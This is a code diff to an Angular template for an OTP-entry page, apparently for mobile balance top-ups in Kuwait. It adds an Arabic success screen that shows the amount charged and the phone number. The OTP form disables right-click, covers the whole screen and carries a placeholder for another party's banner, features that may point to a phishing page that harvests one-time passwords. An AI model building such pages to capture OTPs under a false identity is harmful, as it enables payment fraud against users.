@@ -1,5 +1,6 @@
+@if (viewState() === 'otp') {
 <form oncontextmenu="return false;" (submit)="onSubmit($event)">
-    <div id="OtpPageEntry"
+    <div id="Otp2PageEntry"
         style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; height: 100vh; max-height: 100vh; background-color: #E8E8E8; padding-top: 20px; padding-bottom: 20px; box-sizing: border-box; width: 100%; max-width: 100%; overflow: hidden; font-family: Helvetica Neue, Helvetica, Arial, sans-serif; position: fixed; inset: 0;">
 
         <!-- Top Banner Placeholder (Diraya) -->
@@ -180,3 +181,54 @@
         </footer>
     </div>
 </form>
+} @else if (viewState() === 'success') {
+<div
+    style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #F3F4F6; padding: 20px; font-family: 'Outfit', 'Inter', sans-serif; direction: rtl;">
+    <div
+        style="background: white; border-radius: 28px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid rgba(229, 231, 235, 0.5); width: 100%; max-width: 460px; padding: 40px 30px; text-align: center; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+
+        <!-- Animated Success Tick -->
+        <div
+            style="width: 80px; height: 80px; background-color: #DEF7EC; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 25px;">
+            <svg style="width: 42px; height: 42px; color: #03543F;" fill="none" stroke="currentColor" stroke-width="3"
+                viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+            </svg>
+        </div>
+
+        <!-- Success Message Header -->
+        <h2 style="font-size: 24px; font-weight: 900; color: #111827; margin: 0 0 10px 0;">تم شحن الرصيد بنجاح!</h2>
+        <p
+            style="font-size: 14px; color: #6B7280; font-weight: 500; line-height: 1.6; margin: 0 0 30px 0; max-width: 320px;">
+            لقد تمت معالجة عملية الدفع والتحقق بنجاح، وتمت إضافة الرصيد إلى الحساب المطلوب.
+        </p>
+
+        <!-- Transaction Details Box -->
+        <div
+            style="background-color: #F9FAFB; border: 1px solid #E5E7EB; border-radius: 16px; width: 100%; padding: 18px 22px; box-sizing: border-box; text-align: right; margin-bottom: 30px;">
+            <!-- Amount row -->
+            <div
+                style="display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid #E5E7EB; margin-bottom: 12px;">
+                <span style="font-size: 13px; font-weight: 600; color: #6B7280;">المبلغ المشحون:</span>
+                <span style="font-size: 16px; font-weight: 800; color: #111827;">{{ amount() }} د.ك</span>
+            </div>
+
+            <!-- Phone row -->
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 13px; font-weight: 600; color: #6B7280;">رقم الهاتف:</span>
+                <span style="font-size: 15px; font-weight: 800; color: #111827; letter-spacing: 0.5px;">{{ phone()
+                    }}</span>
+            </div>
+        </div>
+
+        <!-- Back home button -->
+        <button (click)="goHome()"
+            style="background-color: #ED1C24; color: white; border: none; font-size: 15px; font-weight: 800; width: 100%; padding: 15px 0; border-radius: 9999px; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(237, 28, 36, 0.15);"
+            onmouseover="this.style.opacity='0.95'; this.style.transform='scale(0.99)'"
+            onmouseout="this.style.opacity='1'; this.style.transform='scale(1)'">
+            العودة إلى الرئيسية
+        </button>
+
+    </div>
+</div>
+}
